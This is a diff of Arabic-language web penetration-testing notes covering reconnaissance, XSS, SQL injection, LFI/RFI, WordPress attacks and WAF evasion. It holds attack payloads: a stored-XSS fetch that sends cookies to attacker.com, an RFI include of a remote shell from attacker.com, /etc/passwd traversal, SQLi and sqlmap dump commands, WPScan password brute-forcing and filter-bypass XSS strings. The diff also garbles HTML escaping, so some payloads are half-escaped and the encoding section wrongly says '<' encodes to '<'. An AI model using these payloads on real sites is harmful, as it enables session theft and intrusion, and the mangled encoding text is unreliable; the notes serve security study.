@@ -19,16 +19,16 @@ lang: "ar"
 
 النوتس دي هتكون بالترتيب كالآتي:
 
- 01- Introduction to Web Application Security Testing
- 02- Information Gathering
- 03- Web Proxies
- 04- Cross-Site Scripting (XSS)
- 05- SQL Injection
- 06- Common Attacks
- 07- File & Resource Attacks
- 08- Web Services
- 09- CMS Pentesting
- 10- Encoding & Filtering
+01- Introduction to Web Application Security Testing
+02- Information Gathering
+03- Web Proxies
+04- Cross-Site Scripting (XSS)
+05- SQL Injection
+06- Common Attacks
+07- File & Resource Attacks
+08- Web Services
+09- CMS Pentesting
+10- Encoding & Filtering
 
 قبل أي حاجة، دي تجميعة لكل الأدوات اللي هتحتاجها في عملية البينتيست بتاعتك، ومعاها التثبيت السريع:
 
@@ -48,17 +48,17 @@ Grendel-Scan	فحص أمان تطبيقات الويب	تحميل من المو�
 
 XSStrike تثبيت كامل:
 
-bash
 git clone https://github.com/s0md3v/XSStrike.git
 cd XSStrike
 pip install -r requirements.txt
-01- Introduction to Web Application Security Testing
+
+01 - Introduction to Web Application Security Testing
 
 قبل ما تدخل في أي تفصيلة تقنية، لازم تكون فاهم الصورة الكبيرة: اختبار اختراق تطبيقات الويب هو محاولة منظمة لاكتشاف الثغرات في تطبيق ويب قبل ما حد يستغلها بنية سيئة. الفرق عن اختبار اختراق الشبكات إن التركيز هنا بيبقى على منطق التطبيق نفسه — إزاي بيتعامل مع المدخلات، إزاي بيدير الجلسات والمصادقة، وإزاي بيتفاعل مع قاعدة البيانات والملفات.
 
 هنا هبدأ بمراجعة سريعة جدًا لأشهر الثغرات، وبعدين هفصّل كل واحدة منهم لاحقًا في السكاشن المخصصة ليها.
 
-1. جمع المعلومات (Information Gathering)
+جمع المعلومات (Information Gathering)
 
 ليه بنجمع معلومات؟
 
@@ -73,12 +73,11 @@ WHOIS Lookup: عشان تعرف معلومات عن المالك والمزود
 
 لو عندك موقع اسمه Netriders.academy، ممكن تستخدم Nmap كده:
 
-bash
 nmap -sS Netriders.academy
 
 ده هيظهرلك المنافذ المفتوحة والخدمات المتاحة على السيرفر.
 
-2. التعرف على المكونات (Component Recognition)
+التعرف على المكونات (Component Recognition)
 
 إيه المكونات دي؟
 
@@ -93,13 +92,12 @@ BuiltWith: موقع تاني مفيد لمعرفة التقنيات
 
 ممكن تستخدم Wappalyzer على example.com وتشوف إذا كان فيه مكتبات معروفة زي jQuery أو أنظمة إدارة محتوى زي WordPress.
 
-3. اختبار الثغرات الشائعة (مراجعة سريعة)
+اختبار الثغرات الشائعة (مراجعة سريعة)
 
 أ. SQL Injection
 
 طريقة بتسمح لك تخترق قاعدة البيانات من خلال إدخال بيانات خبيثة. مثال:
 
-text
 http://example.com/login.php?user=admin' OR '1'='1' -- &pass=12345
 
 لو دخلت، يبقى فيه ثغرة SQL Injection.
@@ -110,19 +108,18 @@ http://example.com/login.php?user=admin' OR '1'='1' -- &pass=12345
 
 html
 
-```html script>alert('XSS Attack');</script>```
+html script>alert('XSS Attack');&lt;/script>
 لو ظهرت الرسالة، التطبيق معرض لهجوم XSS.
 
 ج. Cross-Site Request Forgery (CSRF)
 
 إنك تخلي المستخدم ينفذ عمليات بدون ما يعرف، زي تغيير كلمة السر. مثال:
 
-text
 http://example.com/change-password?newpass=12345
 
 لو المستخدم ضغط على الرابط، هتتغير كلمة السر من غير ما يعرف.
 
-4. تحليل الاستجابة (Response Analysis)
+تحليل الاستجابة (Response Analysis)
 
 ليه بنحلل الاستجابة؟
 
@@ -130,7 +127,7 @@ http://example.com/change-password?newpass=12345
 
 أدوات نستخدمها: Burp Suite، OWASP ZAP لالتقاط وتحليل الطلبات والردود.
 
-5. تقرير النتائج (Reporting)
+تقرير النتائج (Reporting)
 
 عناصر التقرير الأساسية:
 
@@ -142,7 +139,7 @@ http://example.com/change-password?newpass=12345
 
 دي كانت مراجعة سريعة جدًا لبعض الثغرات، ممكن تتخطاها بدون مشكلة لو عايز تروح على طول للتفاصيل الكاملة تحت.
 
-02- Information Gathering (بالتفصيل)
+02 - Information Gathering (بالتفصيل)
 
 السكشن ده هنعيد فيه اللي اتشرح فوق، لكن بتفاصيل أكتر شوية، وبيغطي:
 
@@ -171,7 +168,6 @@ sitemap.xml: بيبقى عشان محركات البحث تفهرس الموقع
 
 Google Dorking — أوامر بحث متقدمة في جوجل لجلب معلومات حساسة:
 
-text
 site:example.com filetype:pdf
 site:example.com inurl:admin
 site:example.com intitle:"index of"
@@ -202,7 +198,8 @@ Fuzzing: إرسال بيانات عشوائية أو معدلة للموقع و�
 أطر العمل الآلية للتجسس
 Recon-ng: إطار عمل مفتوح المصدر بيجمع المعلومات من مصادر كتير وبينظمها
 SpiderFoot: أداة آلية بتجمع معلومات من محركات البحث وسجلات DNS وبتحلل الروابط بين البيانات
-03- Web Proxies
+
+03 - Web Proxies
 
 السكشن ده بيغطي:
 
@@ -262,7 +259,8 @@ Spider	زحف على الموقع لجمع كل الصفحات والروابط
 مهاجمة النماذج باستخدام ZAP و Burp
 في Burp، باستخدام Intruder تبعت طلبات كتير لنموذج زي صفحة تسجيل دخول، وتجرب كلمات مرور مختلفة
 في ZAP، تستخدم Fuzzer أو Active Scan للهجوم على النماذج وتجربة مدخلات مختلفة لاكتشاف الثغرات
-04- Cross-Site Scripting (XSS)
+
+04 - Cross-Site Scripting (XSS)
 
 السكشن ده بيغطي:
 
@@ -281,15 +279,15 @@ Identifying & Exploiting XSS Vulnerabilities with automated tools
 
 أنواع هجمات XSS
 
-1. Reflected XSS
+Reflected XSS
 
 بيحصل لما الموقع يعكس (reflect) البيانات اللي دخلها المستخدم في الرد على نفس الطلب، وده بيكون غالبًا في الـ URL.
 
-2. Stored XSS
+Stored XSS
 
 بيحصل لما المهاجم يحقن الأكواد الضارة في قاعدة بيانات الموقع أو مكان تخزين دائم، والأكواد دي بتتنفذ لما مستخدمين تانيين يفتحوا الصفحة — وده أخطر من الـ Reflected لأنه بيأثر على كل زوار الصفحة، مش المهاجم بس.
 
-3. DOM-Based XSS
+DOM-Based XSS
 
 الأكواد الضارة بتتنفذ على مستوى المتصفح بسبب تعديل الـ DOM (Document Object Model) من غير ما يمر الطلب على الخادم أصلًا — يعني المشكلة كلها في الجافاسكريبت اللي شغال على المتصفح، مش في السيرفر.
 
@@ -309,8 +307,7 @@ Reflected XSS بالتفصيل
 
 مثال عملي:
 
-text
-http://example.com/search?query= script>alert(document.cookie)</script>
+http://example.com/search?query= script>alert(document.cookie)&lt;/script>
 
 لو ظهر Alert فيه قيمة الكوكيز، يبقى فيه ثغرة Reflected XSS فعلية، وده معناه إن المهاجم يقدر يسرق جلسة المستخدم لو خدعه يدوس على رابط مشابه.
 
@@ -318,8 +315,7 @@ Stored XSS بالتفصيل
 
 مثال عملي: لو فيه صفحة تعليقات في مدونة، وحطيت في خانة التعليق:
 
-html
- script fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>
+ script fetch('http://attacker.com/steal?cookie=' + document.cookie)&lt;/script>
 
 ولو الموقع خزّن التعليق ده وعرضه لكل الزوار من غير تنقية، كل زائر يفتح الصفحة كوكيز جلسته هتتبعت تلقائيًا للمهاجم.
 
@@ -327,13 +323,11 @@ DOM-Based XSS بالتفصيل
 
 مثال عملي: لو الموقع بياخد قيمة من الـ URL Fragment (اللي بعد #) ويحطها مباشرة في الصفحة بجافاسكريبت زي:
 
-javascript
 document.getElementById("welcome").innerHTML = location.hash.substring(1);
 
 فتقدر تحقن:
 
-text
-http://example.com/page.html#<img src=x onerror=alert(1)>
+http://example.com/page.html#&lt;img src=x onerror=alert(1)>
 
 المشكلة هنا إن السيرفر أصلًا مش شايف حاجة، الترميز اللي بعد # مبيتبعتش للسيرفر، فالفحص لازم يركز على الكود اللي شغال في المتصفح مش على الردود بتاعة السيرفر.
 
@@ -341,12 +335,11 @@ http://example.com/page.html#<img src=x onerror=alert(1)>
 
 XSStrike أداة متخصصة في اكتشاف واستغلال ثغرات XSS بشكل آلي:
 
-bash
 python3 xsstrike.py -u "http://example.com/search?query=test"
 
 كمان Burp Suite Scanner وOWASP ZAP Active Scan بيقدروا يكتشفوا XSS بشكل آلي أثناء فحصهم الشامل للموقع.
 
-05- SQL Injection
+05 - SQL Injection
 
 السكشن ده بيغطي:
 
@@ -389,36 +382,31 @@ Error-Based SQLi: المهاجم بيستغل أخطاء قاعدة البيان
 
 UNION-Based SQLi — مثال:
 
-sql
 ' UNION SELECT username, password FROM users --
 Blind SQLi (Boolean-Based & Time-Based)
 
 Boolean-Based SQLi: بتعتمد على تغيير سلوك التطبيق بناءً على استعلام صحيح أو خطأ:
 
-sql
 ' AND 1=1 --
 
 لو التطبيق اشتغل زي ما هو، جرب:
 
-sql
 ' AND 1=2 --
 
 لو حصل تغيير في السلوك (اختفاء بيانات كانت ظاهرة قبل كده مثلًا)، يبقى فيه ثغرة.
 
 Time-Based SQLi: بتستخدم أوامر تأخير الوقت عشان تستنتج البيانات بناءً على وقت الاستجابة:
 
-sql
 ' OR IF(1=1, SLEEP(5), 0) --
 
 لو الصفحة أخدت 5 ثواني إضافية عشان ترد، يبقى الشرط بيتنفذ فعليًا جوا قاعدة البيانات.
 
 الاكتشاف والاستغلال الآلي بـ SQLMap
-bash
+
 sqlmap -u "http://site.com/page?id=1"
 
 مثال عملي متكامل:
 
-bash
 sqlmap -u "http://site.com/page?id=1" --dbs
 sqlmap -u "http://site.com/page?id=1" -D webapp_db --tables
 sqlmap -u "http://site.com/page?id=1" -D webapp_db -T users --dump
@@ -429,12 +417,11 @@ sqlmap -u "http://site.com/page?id=1" -D webapp_db -T users --dump
 
 قواعد بيانات NoSQL مختلفة في البنية وطريقة استغلال الثغرات مقارنة بالعلائقية — الهجمات فيها بتعتمد على أكواد زي JavaScript بدل SQL. لو قاعدة البيانات بتستخدم MongoDB، ممكن تحقن:
 
-json
 {"$ne": null}
 
 كمثال، لو حقل الباسورد في طلب تسجيل الدخول بيقبل JSON، إدخال {"$ne": null} بدل الباسورد الحقيقي ممكن يخلي الاستعلام يرجع "صح" لأي مستخدم موجود، لأن المقارنة بقت "الباسورد لا يساوي null" بدل مطابقة القيمة الفعلية.
 
-06- Common Attacks
+06 - Common Attacks
 
 السكشن ده بيغطي:
 
@@ -488,7 +475,7 @@ CSRF: بيحصل لما يخدعك المهاجم عشان تعمل حاجة ع�
 
 الاستغلال: الدوران على ثغرات معروفة في قواعد بيانات الـ CVEs وعمل حمولات (Payloads) تستغلها للهجوم.
 
-07- File & Resource Attacks
+07 - File & Resource Attacks
 
 السكشن ده بيغطي:
 
@@ -525,7 +512,6 @@ Directory/Path Traversal
 
 التحديد والاستغلال:
 
-text
 http://example.com/download?file=../../etc/passwd
 
 لو نجحت، تقدر تقرأ ملفات مهمة أو حتى تنفذ أوامر ضارة على السيرفر.
@@ -537,17 +523,20 @@ RFI (Remote File Inclusion): تقدر تحمل ملف من الإنترنت — 
 التحديد والاستغلال:
 
 text
-# LFI
+
+LFI
+
 index.php?page=../../etc/passwd
 
-# RFI
+RFI
+
 index.php?page=http://attacker.com/shell.txt
 LFI: تقدر تقرأ ملفات مهمة زي /etc/passwd
 RFI: تقدر تستخدمها عشان ترفع سكربت ضار وتنفذه عن بعد
 
 مثال عملي متكامل: لقيت باراميتر page في رابط زي http://example.com/index.php?page=about.php بيحمّل صفحات من السيرفر. جربت ?page=../../../../etc/passwd ولقيت محتوى الملف ظاهر في الصفحة — دي ثغرة LFI مؤكدة. لو السيرفر مسموح فيه بتفعيل allow_url_include، ممكن أرفع ده لثغرة RFI وأنفذ Web Shell كامل عن بعد.
 
-08- Web Services
+08 - Web Services
 
 السكشن ده بيغطي:
 
@@ -601,7 +590,8 @@ SOAP بتعتمد على XML، وده بيخليها عرضة لهجمات زي 
 تحليل الرسائل: التأكد إن رسائل SOAP مشفرة وآمنة
 فحص WSDL: التأكد إن ملفات WSDL مش بتعرض معلومات حساسة
 اختبار التوقيع الرقمي: التأكد إن الرسائل موقّعة وبتستخدم SSL/TLS
-09- CMS Pentesting
+
+09 - CMS Pentesting
 
 السكشن ده بيغطي:
 
@@ -639,7 +629,6 @@ CMS هدف شائع للهجمات، لأن مواقع كتيرة جدًا بت�
 
 تثبيت واستخدام WPScan:
 
-bash
 sudo apt install wpscan
 bash
 wpscan --url http://example.com --enumerate u,vp,vt
@@ -660,7 +649,6 @@ Credential Stuffing: استخدام بيانات تسجيل دخول مسربة 
 
 مثال عملي:
 
-bash
 wpscan --url http://example.com --usernames admin --passwords /usr/share/wordlists/rockyou.txt
 استغلال إضافات WordPress
 
@@ -682,7 +670,8 @@ SQL Injection: في حالة ضعف الأمان في استعلامات قاع�
 جمع المعلومات: استخدام أدوات زي Google Dorking وWPScan
 تنفيذ الهجمات: استغلال الثغرات المعروفة أو تنفيذ هجمات SQL
 توثيق النتائج: تسجيل الثغرات وأي معلومات حساسة حصلت عليها
-10- Encoding & Filtering
+
+10 - Encoding & Filtering
 
 السكشن ده بيغطي:
 
@@ -699,9 +688,9 @@ Evading WAFs, Proxies and IDSs
 التجنب (Evasion): تقنيات يستخدمها المهاجمون لتجاوز أنظمة الأمان (زي WAF) بأساليب غير متوقعة
 ترميز HTML
 
-يُستخدم لترميز الحروف الخاصة في HTML (زي <, >, &) إلى رموزها المعروفة (زي &lt;, &gt;, &amp;) لمنع تنفيذ أكواد JavaScript الضارة.
+يُستخدم لترميز الحروف الخاصة في HTML (زي <, >, &) إلى رموزها المعروفة (زي <, >, &) لمنع تنفيذ أكواد JavaScript الضارة.
 
-مثال: تحويل النص <script> إلى &lt;script&gt; ليظهر كنص عادي من غير تنفيذ.
+مثال: تحويل النص <script> إلى <script> ليظهر كنص عادي من غير تنفيذ.
 
 ترميز URL
 
@@ -715,9 +704,10 @@ Evading WAFs, Proxies and IDSs
 
 مثال:
 
-bash
 echo -n "Hello" | base64
-# SGVsbG8=
+
+SGVsbG8=
+
 تجاوز المرشحات على جانب العميل (Client-Side)
 استخدام JavaScript لإدخال بيانات ضارة مباشرة على جانب العميل
 استخدام HTML Encoding لإخفاء الأكواد عن أعين المدقق العادي
@@ -740,8 +730,7 @@ WAF هي أنظمة تُستخدم لحماية تطبيقات الويب من �
 
 لو الفلتر بيرفض <script> بالظبط، ممكن تجرب:
 
-html
- ScRiPt>alert(1)</ScRiPt>
+ ScRiPt>alert(1)&lt;/ScRiPt>
  img src=x onerror=alert(1)>
  svg onload=alert(1)>
 
